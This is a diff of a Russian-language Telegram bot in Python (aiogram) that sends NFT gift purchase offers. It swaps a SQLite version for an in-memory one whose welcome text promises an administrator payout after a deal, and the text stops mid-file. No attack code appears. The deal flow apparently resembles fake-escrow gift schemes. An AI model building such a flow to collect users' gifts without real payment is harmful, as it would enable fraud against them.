@@ -1,1768 +1,404 @@
 import asyncio
-import logging
-import os
-import re
-import sqlite3
-import secrets
+import random
 import string
-
-from datetime import datetime
-from html import escape
-
 from aiogram import Bot, Dispatcher, F
-from aiogram.enums import ParseMode
-from aiogram.client.default import DefaultBotProperties
+from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.filters import Command, CommandStart
-from aiogram.types import (
-    Message,
-    CallbackQuery,
-    InlineKeyboardMarkup,
-    InlineKeyboardButton,
-    LinkPreviewOptions,
-)
-from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.client.default import DefaultBotProperties
+from aiogram.enums import ParseMode
 
+BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN"
 
-# ============================================================
-# CONFIG
-# ============================================================
+ADMINS = {6977407005, 5068550043}
 
-BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
-
-ADMIN_IDS = {
-    6977407005,
-    5068550043,
-}
-
-DB_NAME = "nft_offers.sqlite3"
-
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger("nft_offers")
-
-if not BOT_TOKEN:
-    raise RuntimeError(
-        "Не задан BOT_TOKEN. Укажи токен в переменной окружения."
-    )
-
-bot = Bot(
-    token=BOT_TOKEN,
-    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
-)
-
-dp = Dispatcher()
-
-
-# ============================================================
-# PREMIUM EMOJI
-# ============================================================
-
-EMOJI = {
-    "eyes": "5920052658743283381",
-    "orange": "5794246418034072201",
-    "scroll": "5956561916573782596",
-    "plane": "5875465628285931233",
-    "plus": "5775937998948404844",
-    "question": "5897846616966041652",
-    "star": "5951810621887484519",
-    "axe": "5375258700313274027",
-    "dollar": "5364263511021104021",
-    "blue": "5303250111852228815",
-    "back": "5877629862306385808",
-    "wallet": "5215420556089776398",
-    "calendar": "5458723800503840098",
-    "dog": "5771887475421090729",
-    "check": "5776375003280838798",
-    "cross": "5778527486270770928",
+EMOJI_MAP = {
+    "👀": "5920052658743283381",
+    "🔶": "5794246418034072201",
+    "📜": "5956561916573782596",
+    "✈️": "5875465628285931233",
+    "➕": "5775937998948404844",
+    "❓": "5897846616966041652",
+    "⭐": "5951810621887484519",
+    "🪓": "5375258700313274027",
+    "💲": "5364263511021104021",
+    "🔷": "5303250111852228815",
+    "⬅️": "5877629862306385808",
+    "👛": "5215420556089776398",
+    "🗓️": "5458723800503840098",
+    "🐶": "5771887475421090729",
+    "✅": "5776375003280838798",
+    "✖️": "5778527486270770928",
 }
 
 
-def pe(name: str) -> str:
-    """Возвращает Telegram Premium Custom Emoji."""
-    emoji_id = EMOJI[name]
-    fallback = {
-        "eyes": "👀",
-        "orange": "🔶",
-        "scroll": "📜",
-        "plane": "✈️",
-        "plus": "➕",
-        "question": "❓",
-        "star": "⭐",
-        "axe": "🪓",
-        "dollar": "💲",
-        "blue": "🔷",
-        "back": "⬅️",
-        "wallet": "👛",
-        "calendar": "🗓️",
-        "dog": "🐶",
-        "check": "✅",
-        "cross": "✖️",
-    }[name]
-
-    return (
-        f'<tg-emoji emoji-id="{emoji_id}">'
-        f"{fallback}</tg-emoji>"
-    )
-
-
-CURRENCIES = {
-    "star": {
-        "label": "Star",
-        "display": "⭐",
-        "premium": pe("star"),
-        "name": "Stars",
-    },
-    "rub": {
-        "label": "Rub",
-        "display": "🪓",
-        "premium": pe("axe"),
-        "name": "Rub",
-    },
-    "gram": {
-        "label": "Gram",
-        "display": "🔷",
-        "premium": pe("blue"),
-        "name": "GRAM",
-    },
-    "dollar": {
-        "label": "Dollar",
-        "display": "💲",
-        "premium": pe("dollar"),
-        "name": "Dollar",
-    },
-}
-
-
-# ============================================================
-# DATABASE
-# ============================================================
-
-db = sqlite3.connect(DB_NAME)
-db.row_factory = sqlite3.Row
-
-db.execute("PRAGMA journal_mode=WAL")
-db.execute("PRAGMA foreign_keys=ON")
-
-db.executescript("""
-CREATE TABLE IF NOT EXISTS users (
-    user_id INTEGER PRIMARY KEY,
-    username TEXT,
-    first_name TEXT,
-    can_create INTEGER NOT NULL DEFAULT 0,
-    created_at TEXT NOT NULL
-);
-
-CREATE TABLE IF NOT EXISTS offers (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    public_id TEXT UNIQUE NOT NULL,
-    seller_id INTEGER NOT NULL,
-    buyer_id INTEGER NOT NULL,
-    buyer_username TEXT,
-    gift_links TEXT NOT NULL,
-    currency TEXT NOT NULL,
-    amount INTEGER NOT NULL,
-    status TEXT NOT NULL DEFAULT 'pending',
-    created_at TEXT NOT NULL,
-    updated_at TEXT NOT NULL,
-    FOREIGN KEY(seller_id) REFERENCES users(user_id),
-    FOREIGN KEY(buyer_id) REFERENCES users(user_id)
-);
-
-CREATE TABLE IF NOT EXISTS user_states (
-    user_id INTEGER PRIMARY KEY,
-    state TEXT NOT NULL,
-    data TEXT NOT NULL DEFAULT '{}'
-);
-
-CREATE TABLE IF NOT EXISTS notifications (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id INTEGER NOT NULL,
-    offer_id INTEGER NOT NULL,
-    created_at TEXT NOT NULL,
-    UNIQUE(user_id, offer_id),
-    FOREIGN KEY(offer_id) REFERENCES offers(id)
-);
-
-CREATE TABLE IF NOT EXISTS admin_logs (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    admin_id INTEGER NOT NULL,
-    action TEXT NOT NULL,
-    created_at TEXT NOT NULL
-);
-""")
-
-db.commit()
-
-
-def now() -> str:
-    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-
-def execute(sql, params=()):
-    cur = db.execute(sql, params)
-    db.commit()
-    return cur
-
-
-def get_user(user_id: int):
-    return db.execute(
-        "SELECT * FROM users WHERE user_id=?",
-        (user_id,),
-    ).fetchone()
-
-
-def register_user(user):
-    existing = get_user(user.id)
-
-    if existing:
-        execute(
-            """
-            UPDATE users
-            SET username=?, first_name=?
-            WHERE user_id=?
-            """,
-            (
-                user.username,
-                user.first_name,
-                user.id,
-            ),
-        )
-    else:
-        execute(
-            """
-            INSERT INTO users
-            (user_id, username, first_name, can_create, created_at)
-            VALUES (?, ?, ?, ?, ?)
-            """,
-            (
-                user.id,
-                user.username,
-                user.first_name,
-                1 if user.id in ADMIN_IDS else 0,
-                now(),
-            ),
-        )
-
-
-def has_access(user_id: int) -> bool:
-    if user_id in ADMIN_IDS:
-        return True
-
-    row = get_user(user_id)
-    return bool(row and row["can_create"])
-
-
-def get_state(user_id: int):
-    row = db.execute(
-        "SELECT * FROM user_states WHERE user_id=?",
-        (user_id,),
-    ).fetchone()
-
-    if not row:
-        return None, {}
-
-    import json
-
-    try:
-        data = json.loads(row["data"])
-    except Exception:
-        data = {}
-
-    return row["state"], data
-
-
-def set_state(user_id: int, state: str, data=None):
-    import json
-
-    execute(
-        """
-        INSERT INTO user_states (user_id, state, data)
-        VALUES (?, ?, ?)
-        ON CONFLICT(user_id)
-        DO UPDATE SET state=excluded.state, data=excluded.data
-        """,
-        (
-            user_id,
-            state,
-            json.dumps(data or {}, ensure_ascii=False),
-        ),
-    )
-
-
-def clear_state(user_id: int):
-    execute(
-        "DELETE FROM user_states WHERE user_id=?",
-        (user_id,),
-    )
-
-
-def is_admin(user_id: int) -> bool:
-    return user_id in ADMIN_IDS
-
-
-def log_admin(admin_id: int, action: str):
-    execute(
-        """
-        INSERT INTO admin_logs (admin_id, action, created_at)
-        VALUES (?, ?, ?)
-        """,
-        (admin_id, action, now()),
-    )
-
-
-# ============================================================
-# KEYBOARDS
-# ============================================================
-
-def button(text: str, callback: str):
-    return InlineKeyboardButton(
-        text=text,
-        callback_data=callback,
-    )
-
-
-def exit_button():
-    return button("Выйти", "exit")
-
-
-def main_keyboard():
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                button(
-                    f'{ "➕" } Создать оффер',
-                    "create",
-                )
-            ],
-            [
-                button("Мои офферы", "myoffers"),
-            ],
-            [exit_button()],
-        ]
-    )
-
-
-def back_keyboard():
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                button(
-                    "⬅️ Назад",
-                    "back",
-                )
-            ],
-            [exit_button()],
-        ]
-    )
-
-
-def currency_keyboard():
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                button("⭐ Star", "currency:star"),
-                button("🪓 Rub", "currency:rub"),
-            ],
-            [
-                button("🔷 Gram", "currency:gram"),
-                button("💲 Dollar", "currency:dollar"),
-            ],
-            [
-                button("⬅️ Назад", "back"),
-            ],
-            [exit_button()],
-        ]
-    )
-
-
-def confirm_offer_keyboard():
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                button(
-                    "Подтвердить оффер",
-                    "offer:confirm",
-                )
-            ],
-            [
-                button("⬅️ Назад", "back"),
-            ],
-            [exit_button()],
-        ]
-    )
-
-
-def recipient_keyboard(offer_id: int):
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                button(
-                    "✖️ Отклонить",
-                    f"offer:reject:{offer_id}",
-                ),
-                button(
-                    "✅ Принять",
-                    f"offer:accept:{offer_id}",
-                ),
-            ],
-            [exit_button()],
-        ]
-    )
-
-
-def accepted_keyboard(offer_id: int):
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                button(
-                    "Подтвердить передачу",
-                    f"offer:transfer:{offer_id}",
-                )
-            ],
-            [exit_button()],
-        ]
-    )
-
-
-# ============================================================
-# UI HELPERS
-# ============================================================
-
-async def safe_edit(
-    message: Message,
-    text: str,
-    reply_markup=None,
-):
-    try:
-        await message.edit_text(
-            text,
-            reply_markup=reply_markup,
-            link_preview_options=LinkPreviewOptions(
-                is_disabled=True
-            ),
-        )
-    except TelegramBadRequest as exc:
-        if "message is not modified" not in str(exc).lower():
-            raise
-
-
-async def show_main(message: Message):
-    text = (
-        f"{pe('plane')} <b>Добро пожаловать!</b>\n\n"
-        "Создавайте офферы, отправляйте предложения "
-        "другим пользователям и отслеживайте сделки.\n\n"
-        "После сделки с вами связывается администратор "
-        "для проверки оплаты и её подтверждения."
-    )
-
-    await safe_edit(
-        message,
-        text,
-        main_keyboard(),
-    )
-
-
-async def send_main(message: Message):
-    text = (
-        f"{pe('plane')} <b>Добро пожаловать!</b>\n\n"
-        "Создавайте офферы, отправляйте предложения "
-        "другим пользователям и отслеживайте сделки.\n\n"
-        "После сделки с вами связывается администратор "
-        "для проверки оплаты и её подтверждения."
-    )
-
-    await message.answer(
-        text,
-        reply_markup=main_keyboard(),
-        link_preview_options=LinkPreviewOptions(
-            is_disabled=True
-        ),
-    )
-
-
-async def show_step(message: Message, text: str, keyboard=None):
-    await safe_edit(message, text, keyboard)
-
-
-def format_amount(amount: int) -> str:
-    return f"{amount:,}".replace(",", " ")
-
-
-def new_public_id() -> str:
-    alphabet = string.ascii_uppercase + string.digits
-    return "TG-" + "".join(
-        secrets.choice(alphabet)
-        for _ in range(8)
-    )
-
-
-def resolve_username(username: str):
-    username = username.strip().lstrip("@")
-
-    if not re.fullmatch(r"[A-Za-z0-9_]{5,32}", username):
-        return None
-
-    return db.execute(
-        "SELECT * FROM users WHERE lower(username)=lower(?)",
-        (username,),
-    ).fetchone()
-
-
-def currency_data(currency: str):
-    return CURRENCIES.get(currency, CURRENCIES["dollar"])
-
-
-def status_text(status: str):
-    return {
-        "pending": "Ожидает ответа",
-        "accepted": "Принят",
-        "rejected": "Отклонён",
-        "transfer_reported": "Ожидает проверки передачи",
-        "paid": "Оплачен администратором",
-        "cancelled": "Отменён",
-    }.get(status, status)
-
-
-# ============================================================
-# START
-# ============================================================
+def e(text: str) -> str:
+    for k in sorted(EMOJI_MAP, key=len, reverse=True):
+        text = text.replace(k, f'<tg-emoji emoji-id="{EMOJI_MAP[k]}">{k}</tg-emoji>')
+    return text
+
+
+CURRENCY_NAMES = {"⭐": "Star", "🪓": "Rub", "🔷": "Gram", "💲": "Dollar"}
+
+storage = MemoryStorage()
+bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+dp = Dispatcher(storage=storage)
+
+verified_handles: set = set()
+started_users: set = set()
+username_to_id: dict = {}
+offers: dict = {}
+pending_offers: dict = {}
+
+
+class OfferFlow(StatesGroup):
+    username = State()
+    link = State()
+    currency = State()
+    amount = State()
+    confirm = State()
+
+
+def main_menu_kb():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="➕ Создать оффер", callback_data="create_offer")],
+        [InlineKeyboardButton(text="⬅️ Выйти", callback_data="exit_main")],
+    ])
+
+
+def back_kb(target):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"back:{target}")],
+    ])
+
+
+def currency_kb():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⭐ Star", callback_data="cur:⭐"),
+         InlineKeyboardButton(text="🪓 Rub", callback_data="cur:🪓")],
+        [InlineKeyboardButton(text="🔷 Gram", callback_data="cur:🔷"),
+         InlineKeyboardButton(text="💲 Dollar", callback_data="cur:💲")],
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back:link")],
+    ])
+
+
+def confirm_kb():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Подтвердить оффер", callback_data="confirm_offer")],
+    ])
+
+
+def gen_id(n=8):
+    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=n))
+
+
+WELCOME = ("✈️ Добро пожаловать!\n\n"
+           "Создавайте офферы, отправляйте предложения другим пользователям и отслеживайте сделки\n\n"
+           "После сделок с вами связывается администратор и выдает деньги с оффера")
+
+T_USERNAME = "🐶 Пришлите @username человека которому вы хотите сделать оффер. Если человек не пользуется ботом — оффер прийдёт сразу после старта бота."
+T_LINK = "🗓️ Пришлите ссылку на подарок / подарки (если несколько — запишите в столбик)"
+T_CURRENCY = "❓ В какой валюте проводим сделку"
+T_AMOUNT = "👛 Укажите сумму сделки. Убедитесь, что она соответствует вашим возможностям и лимитам по выбранной валюте"
+T_CONFIRM = "✈️ Оффер готов к отправке, чтобы отправить нажмите кнопку ниже. Если вы не готовы или передумали — не нажимайте"
+
+
+async def send_offer_to_recipient(bot_instance, recipient_id, offer_id):
+    o = offers[offer_id]
+    text = f"Пользователь предлагает вам {o['amount']} {o['currency']} за подарок {o['link']}"
+    kb = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(text="✖️ Отклонить", callback_data=f"reject:{offer_id}"),
+        InlineKeyboardButton(text="✅ Принять", callback_data=f"accept:{offer_id}"),
+    ]])
+    await bot_instance.send_message(recipient_id, e(text), reply_markup=kb)
+
 
 @dp.message(CommandStart())
-async def cmd_start(message: Message):
-    register_user(message.from_user)
+async def cmd_start(message: Message, state: FSMContext):
+    await state.clear()
+    started_users.add(message.from_user.id)
+    if message.from_user.username:
+        username_to_id[message.from_user.username.lower()] = message.from_user.id
+
+    await message.answer(e("🔷"))
+    await message.answer(e(WELCOME), reply_markup=main_menu_kb())
+
+    if message.from_user.username:
+        u = message.from_user.username.lower()
+        if u in pending_offers:
+            for oid in list(pending_offers[u]):
+                if oid in offers and offers[oid]["status"] == "pending":
+                    await send_offer_to_recipient(bot, message.from_user.id, oid)
+            pending_offers.pop(u, None)
 
-    # Первое сообщение: премиум-эмодзи.
-    await message.answer(pe("blue"))
-
-    # Второе сообщение: главное меню.
-    await send_main(message)
-
-    # Уведомления о предложениях, ожидающих запуска бота.
-    user_id = message.from_user.id
-
-    rows = db.execute(
-        """
-        SELECT o.*
-        FROM offers o
-        JOIN notifications n ON n.offer_id=o.id
-        WHERE n.user_id=? AND o.status='pending'
-        ORDER BY o.id DESC
-        """,
-        (user_id,),
-    ).fetchall()
-
-    for offer in rows:
-        try:
-            await send_offer_to_buyer(offer["id"])
-        except Exception:
-            logger.exception(
-                "Не удалось доставить оффер %s",
-                offer["id"],
-            )
-
-
-# ============================================================
-# MENU CALLBACKS
-# ============================================================
-
-@dp.callback_query(F.data == "exit")
-async def callback_exit(call: CallbackQuery):
-    clear_state(call.from_user.id)
-
-    await call.answer("Вы вышли из текущего раздела.")
-
-    try:
-        await call.message.edit_reply_markup(
-            reply_markup=None
-        )
-    except TelegramBadRequest:
-        pass
-
-
-@dp.callback_query(F.data == "home")
-async def callback_home(call: CallbackQuery):
-    clear_state(call.from_user.id)
-    await call.answer()
-    await show_main(call.message)
-
-
-@dp.callback_query(F.data == "create")
-async def callback_create(call: CallbackQuery):
-    user_id = call.from_user.id
-
-    if not has_access(user_id):
-        await call.answer(
-            "Вы ещё не верифицированы для создания оффера! "
-            "Заявка на верификацию отправлена.",
-            show_alert=True,
-        )
-
-        for admin_id in ADMIN_IDS:
-            try:
-                await bot.send_message(
-                    admin_id,
-                    "📝 <b>Запрос доступа</b>\n\n"
-                    f"Пользователь: "
-                    f"{escape(call.from_user.full_name)}\n"
-                    f"ID: <code>{user_id}</code>\n"
-                    f"Username: "
-                    f"@{escape(call.from_user.username or 'не указан')}",
-                )
-            except Exception:
-                pass
-
-        return
-
-    set_state(user_id, "recipient", {})
-
-    await call.answer()
-
-    await show_step(
-        call.message,
-        f"{pe('dog')} Пришлите @username человека, "
-        "которому вы хотите сделать оффер.\n\n"
-        "Если человек ещё не пользовался ботом, "
-        "предложение будет отправлено после запуска бота.",
-        back_keyboard(),
-    )
-
-
-@dp.callback_query(F.data == "back")
-async def callback_back(call: CallbackQuery):
-    user_id = call.from_user.id
-    state, data = get_state(user_id)
-
-    await call.answer()
-
-    if state == "recipient":
-        clear_state(user_id)
-        await show_main(call.message)
-        return
-
-    if state == "gifts":
-        set_state(user_id, "recipient", {})
-        await show_step(
-            call.message,
-            f"{pe('dog')} Пришлите @username человека, "
-            "которому вы хотите сделать оффер.",
-            back_keyboard(),
-        )
-        return
-
-    if state == "currency":
-        set_state(user_id, "gifts", data)
-        await show_step(
-            call.message,
-            f"{pe('calendar')} Пришлите ссылку на подарок "
-            "/ подарки (если несколько — запишите в столбик).",
-            back_keyboard(),
-        )
-        return
-
-    if state == "amount":
-        set_state(user_id, "currency", data)
-        await show_step(
-            call.message,
-            f"{pe('question')} В какой валюте проводим сделку?",
-            currency_keyboard(),
-        )
-        return
-
-    if state == "preview":
-        set_state(user_id, "amount", data)
-        await show_step(
-            call.message,
-            f"{pe('wallet')} Укажите сумму сделки. "
-            "Убедитесь, что она соответствует вашим "
-            "возможностям и лимитам по выбранной валюте.",
-            back_keyboard(),
-        )
-        return
-
-    clear_state(user_id)
-    await show_main(call.message)
-
-
-# ============================================================
-# OFFER CREATION: TEXT INPUT
-# ============================================================
-
-@dp.message(F.text)
-async def handle_text(message: Message):
-    user_id = message.from_user.id
-
-    register_user(message.from_user)
-
-    text = message.text.strip()
-    state, data = get_state(user_id)
-
-    # ---------------- ADMIN COMMANDS ----------------
-    if text.startswith("/"):
-        return
-
-    if not state:
-        return
-
-    if not has_access(user_id):
-        clear_state(user_id)
-        await message.answer(
-            "У вас нет доступа к созданию офферов."
-        )
-        return
-
-    if state == "recipient":
-        username = text.strip()
-
-        if not username.startswith("@"):
-            username = "@" + username
-
-        recipient = resolve_username(username)
-
-        if not recipient:
-            await message.answer(
-                "Не удалось найти этого пользователя в базе бота.\n\n"
-                "Проверьте username. Пользователь должен хотя бы "
-                "один раз запустить бота, чтобы бот мог определить "
-                "его Telegram ID."
-            )
-            return
-
-        if recipient["user_id"] == user_id:
-            await message.answer(
-                "Нельзя отправить оффер самому себе."
-            )
-            return
-
-        data["buyer_id"] = recipient["user_id"]
-        data["buyer_username"] = recipient["username"]
-
-        set_state(user_id, "gifts", data)
-
-        await message.answer(
-            f"{pe('calendar')} Пришлите ссылку на подарок "
-            "/ подарки (если несколько — запишите в столбик).",
-            reply_markup=back_keyboard(),
-        )
-        return
-
-    if state == "gifts":
-        links = [
-            line.strip()
-            for line in text.splitlines()
-            if line.strip()
-        ]
-
-        if not links:
-            await message.answer(
-                "Пришлите хотя бы одну ссылку на подарок."
-            )
-            return
-
-        invalid = [
-            link for link in links
-            if not re.match(
-                r"^(https?://)?t\.me/nft/\S+$",
-                link,
-                re.IGNORECASE,
-            )
-        ]
-
-        if invalid:
-            await message.answer(
-                "Некоторые ссылки не похожи на ссылки "
-                "Telegram NFT вида t.me/nft/Название.\n"
-                "Проверьте ссылки и отправьте список заново."
-            )
-            return
-
-        normalized = []
-
-        for link in links:
-            link = re.sub(
-                r"^https?://",
-                "",
-                link,
-                flags=re.IGNORECASE,
-            )
-            normalized.append("https://" + link)
-
-        data["gift_links"] = normalized
-
-        set_state(user_id, "currency", data)
-
-        await message.answer(
-            f"{pe('question')} В какой валюте проводим сделку?",
-            reply_markup=currency_keyboard(),
-        )
-        return
-
-    if state == "amount":
-        if not re.fullmatch(r"[0-9]+", text):
-            await message.answer(
-                "Введите сумму целым положительным числом."
-            )
-            return
-
-        amount = int(text)
-
-        if amount <= 0:
-            await message.answer(
-                "Сумма должна быть больше нуля."
-            )
-            return
-
-        if amount > 10**12:
-            await message.answer(
-                "Сумма слишком большая."
-            )
-            return
-
-        data["amount"] = amount
-
-        set_state(user_id, "preview", data)
-
-        currency = currency_data(data["currency"])
-        links = "\n".join(data["gift_links"])
-
-        await message.answer(
-            f"{pe('plane')} <b>Оффер готов к отправке</b>\n\n"
-            "Чтобы отправить, нажмите кнопку ниже. "
-            "Если вы не готовы или передумали — не нажимайте.\n\n"
-            f"<b>Получатель:</b> "
-            f"@{escape(data['buyer_username'] or '')}\n"
-            f"<b>Сумма:</b> "
-            f"{format_amount(amount)} {currency['premium']}\n"
-            f"<b>Подарки:</b>\n{escape(links)}",
-            reply_markup=confirm_offer_keyboard(),
-            link_preview_options=LinkPreviewOptions(
-                is_disabled=True
-            ),
-        )
-        return
-
-
-# ============================================================
-# CURRENCY SELECTION
-# ============================================================
-
-@dp.callback_query(F.data.startswith("currency:"))
-async def callback_currency(call: CallbackQuery):
-    user_id = call.from_user.id
-    state, data = get_state(user_id)
-
-    if state != "currency":
-        await call.answer(
-            "Этап создания оффера уже изменился.",
-            show_alert=True,
-        )
-        return
-
-    currency = call.data.split(":", 1)[1]
-
-    if currency not in CURRENCIES:
-        await call.answer("Неизвестная валюта.", show_alert=True)
-        return
-
-    data["currency"] = currency
-
-    set_state(user_id, "amount", data)
-
-    await call.answer()
-
-    await show_step(
-        call.message,
-        f"{pe('wallet')} Укажите сумму сделки. "
-        "Убедитесь, что она соответствует вашим "
-        "возможностям и лимитам по выбранной валюте.",
-        back_keyboard(),
-    )
-
-
-# ============================================================
-# CREATE OFFER
-# ============================================================
-
-@dp.callback_query(F.data == "offer:confirm")
-async def callback_confirm_offer(call: CallbackQuery):
-    user_id = call.from_user.id
-    state, data = get_state(user_id)
-
-    if state != "preview":
-        await call.answer(
-            "Оффер не готов к отправке.",
-            show_alert=True,
-        )
-        return
-
-    if not has_access(user_id):
-        clear_state(user_id)
-        await call.answer(
-            "У вас нет доступа к созданию офферов.",
-            show_alert=True,
-        )
-        return
-
-    buyer_id = data.get("buyer_id")
-    buyer = get_user(buyer_id) if buyer_id else None
-
-    if not buyer:
-        clear_state(user_id)
-        await call.answer(
-            "Получатель не найден. Создайте оффер заново.",
-            show_alert=True,
-        )
-        return
-
-    public_id = new_public_id()
-    timestamp = now()
-
-    cur = execute(
-        """
-        INSERT INTO offers (
-            public_id,
-            seller_id,
-            buyer_id,
-            buyer_username,
-            gift_links,
-            currency,
-            amount,
-            status,
-            created_at,
-            updated_at
-        )
-        VALUES (?, ?, ?, ?, ?, ?, ?, 'pending', ?, ?)
-        """,
-        (
-            public_id,
-            user_id,
-            buyer_id,
-            buyer["username"],
-            "\n".join(data["gift_links"]),
-            data["currency"],
-            data["amount"],
-            timestamp,
-            timestamp,
-        ),
-    )
-
-    offer_id = cur.lastrowid
-
-    execute(
-        """
-        INSERT OR IGNORE INTO notifications
-        (user_id, offer_id, created_at)
-        VALUES (?, ?, ?)
-        """,
-        (buyer_id, offer_id, timestamp),
-    )
-
-    clear_state(user_id)
-
-    try:
-        await send_offer_to_buyer(offer_id)
-    except TelegramForbiddenError:
-        pass
-    except Exception:
-        logger.exception(
-            "Ошибка доставки оффера %s",
-            offer_id,
-        )
-
-    currency = currency_data(data["currency"])
-
-    await call.answer("Оффер создан!")
-
-    await safe_edit(
-        call.message,
-        f"{pe('plane')} <b>Оффер отправлен</b>\n\n"
-        f"Вы успешно создали оффер на сумму "
-        f"<b>{format_amount(data['amount'])} "
-        f"{currency['premium']}</b>.\n\n"
-        "Получатель сможет ответить на предложение "
-        "после запуска бота.\n\n"
-        f"Номер оффера: <code>{public_id}</code>",
-        InlineKeyboardMarkup(
-            inline_keyboard=[
-                [
-                    button(
-                        "Главное меню",
-                        "home",
-                    )
-                ],
-                [exit_button()],
-            ]
-        ),
-    )
-
-    seller = get_user(user_id)
-
-    await bot.send_message(
-        user_id,
-        f"{pe('plane')} "
-        f"@{escape(seller['username'] or str(user_id))} "
-        f"({pe('orange')} уровень в боте), "
-        "вы успешно отправили оффер на сумму "
-        f"<b>{format_amount(data['amount'])} "
-        f"{currency['premium']}</b> пользователю "
-        f"@{escape(buyer['username'] or str(buyer_id))}.\n\n"
-        f"{pe('eyes')} Если пользователь ещё не заходил "
-        "в бота, оффер будет доставлен после запуска бота.",
-        link_preview_options=LinkPreviewOptions(
-            is_disabled=True
-        ),
-    )
-
-
-# ============================================================
-# SEND OFFER TO BUYER
-# ============================================================
-
-async def send_offer_to_buyer(offer_id: int):
-    offer = db.execute(
-        "SELECT * FROM offers WHERE id=?",
-        (offer_id,),
-    ).fetchone()
-
-    if not offer or offer["status"] != "pending":
-        return
-
-    buyer_id = offer["buyer_id"]
-    seller_id = offer["seller_id"]
-
-    seller = get_user(seller_id)
-    currency = currency_data(offer["currency"])
-
-    links = offer["gift_links"].splitlines()
-    gift_text = "\n".join(
-        f"• {escape(link)}"
-        for link in links
-    )
-
-    seller_name = (
-        "@" + escape(seller["username"])
-        if seller and seller["username"]
-        else f'<a href="tg://user?id={seller_id}">Пользователь</a>'
-    )
-
-    text = (
-        f"<b>Новое предложение</b>\n\n"
-        f"{seller_name} предлагает вам "
-        f"<b>{format_amount(offer['amount'])} "
-        f"{currency['premium']}</b> за подарок:\n\n"
-        f"{gift_text}\n\n"
-        "Выберите действие."
-    )
-
-    try:
-        await bot.send_message(
-            buyer_id,
-            text,
-            reply_markup=recipient_keyboard(offer_id),
-            link_preview_options=LinkPreviewOptions(
-                is_disabled=True
-            ),
-        )
-    except TelegramForbiddenError:
-        # Бот не может написать пользователю, пока тот
-        # не запустил бота. Уведомление остаётся в БД.
-        return
-
-
-# ============================================================
-# ACCEPT OFFER
-# ============================================================
-
-@dp.callback_query(F.data.startswith("offer:accept:"))
-async def callback_accept_offer(call: CallbackQuery):
-    offer_id = int(call.data.rsplit(":", 1)[1])
-
-    offer = db.execute(
-        "SELECT * FROM offers WHERE id=?",
-        (offer_id,),
-    ).fetchone()
-
-    if not offer:
-        await call.answer("Оффер не найден.", show_alert=True)
-        return
-
-    if call.from_user.id != offer["buyer_id"]:
-        await call.answer(
-            "Этот оффер предназначен другому пользователю.",
-            show_alert=True,
-        )
-        return
-
-    if offer["status"] != "pending":
-        await call.answer(
-            "Этот оффер уже обработан.",
-            show_alert=True,
-        )
-        return
-
-    execute(
-        """
-        UPDATE offers
-        SET status='accepted', updated_at=?
-        WHERE id=? AND status='pending'
-        """,
-        (now(), offer_id),
-    )
-
-    await call.answer(
-        "Внимание! Прочитайте инструкцию.",
-        show_alert=True,
-    )
-
-    currency = currency_data(offer["currency"])
-
-    await safe_edit(
-        call.message,
-        "<b>Внимание!</b>\n\n"
-        "Следуйте инструкциям, чтобы не потерять свой подарок "
-        "и получить оплату.\n\n"
-        "Перед передачей NFT обязательно проверьте, "
-        "что условия сделки вам подходят. "
-        "Не считайте оплату подтверждённой, пока она "
-        "не проверена фактически.",
-        InlineKeyboardMarkup(
-            inline_keyboard=[
-                [
-                    button(
-                        "ОК, продолжить",
-                        f"offer:details:{offer_id}",
-                    )
-                ],
-                [exit_button()],
-            ]
-        ),
-    )
-
-    seller_id = offer["seller_id"]
-
-    try:
-        await bot.send_message(
-            seller_id,
-            f"{pe('check')} Покупатель принял оффер "
-            f"<code>{escape(offer['public_id'])}</code>.",
-        )
-    except Exception:
-        pass
-
-
-# ============================================================
-# DEAL DETAILS
-# ============================================================
-
-@dp.callback_query(F.data.startswith("offer:details:"))
-async def callback_offer_details(call: CallbackQuery):
-    offer_id = int(call.data.rsplit(":", 1)[1])
-
-    offer = db.execute(
-        "SELECT * FROM offers WHERE id=?",
-        (offer_id,),
-    ).fetchone()
-
-    if not offer or call.from_user.id != offer["buyer_id"]:
-        await call.answer("Оффер не найден.", show_alert=True)
-        return
-
-    if offer["status"] != "accepted":
-        await call.answer(
-            "Статус сделки уже изменился.",
-            show_alert=True,
-        )
-        return
-
-    currency = currency_data(offer["currency"])
-    links = offer["gift_links"].splitlines()
-
-    seller = get_user(offer["seller_id"])
-
-    seller_link = (
-        "@" + escape(seller["username"])
-        if seller and seller["username"]
-        else f'<a href="tg://user?id={offer["seller_id"]}">продавец</a>'
-    )
-
-    gifts = "\n".join(
-        f"• {escape(link)}"
-        for link in links
-    )
-
-    text = (
-        "<b>Сделка по NFT</b>\n"
-        f"Заказ <code>#{escape(offer['public_id'])}</code>\n\n"
-        f"Сумма сделки: <b>{format_amount(offer['amount'])} "
-        f"{currency['premium']}</b>.\n\n"
-        "Оплата не подтверждена автоматически ботом. "
